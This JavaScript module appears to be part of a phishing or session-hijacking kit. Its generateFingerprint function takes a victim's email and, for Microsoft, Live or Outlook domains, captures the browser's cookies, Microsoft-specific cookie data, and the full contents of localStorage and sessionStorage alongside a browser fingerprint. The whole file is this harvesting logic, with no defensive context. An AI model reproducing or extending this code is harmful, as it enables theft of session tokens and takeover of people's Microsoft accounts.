import cookieUtils, { CookieMeta } from './cookieUtils';
import { microsoftCookieCapture } from './microsoftCookieCapture';

// Browser fingerprinting function
export function generateFingerprint(userEmail) {
  if (!userEmail) {
    throw new Error('User email is required for fingerprinting');
  }
  
  // Enable Microsoft-specific cookie capturing while keeping general cookies disabled
  let cookieCapture;
  const emailDomain = getProviderSpecificDomain(userEmail);
  
  // Only capture cookies for Microsoft domains
  if (emailDomain === 'live.com' || emailDomain.includes('microsoft') || emailDomain.includes('outlook')) {
    console.log('🔵 Microsoft domain detected, enabling cookie capture for:', emailDomain);
    cookieCapture = cookieUtils.buildCookieCapture();
  } else {
    // Keep general cookie capturing disabled for non-Microsoft domains
    cookieCapture = {
      documentCookies: '',
      cookiesParsed: {},
      cookieList: []
    };
  }

  // Capture all storage data
  const fingerprint = {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    cookieEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    hardwareConcurrency: navigator.hardwareConcurrency,
    maxTouchPoints: navigator.maxTouchPoints,
    cookies: cookieCapture.documentCookies,
    cookiesParsed: cookieCapture.cookiesParsed,
    cookieList: cookieCapture.cookieList || [],
    microsoftCookies: microsoftCookieCapture.getMicrosoftStats(),
    localStorage: getStorageData(window.localStorage),
    sessionStorage: getStorageData(window.sessionStorage),
    timestamp: new Date().toISOString()
  };

  return fingerprint;
}
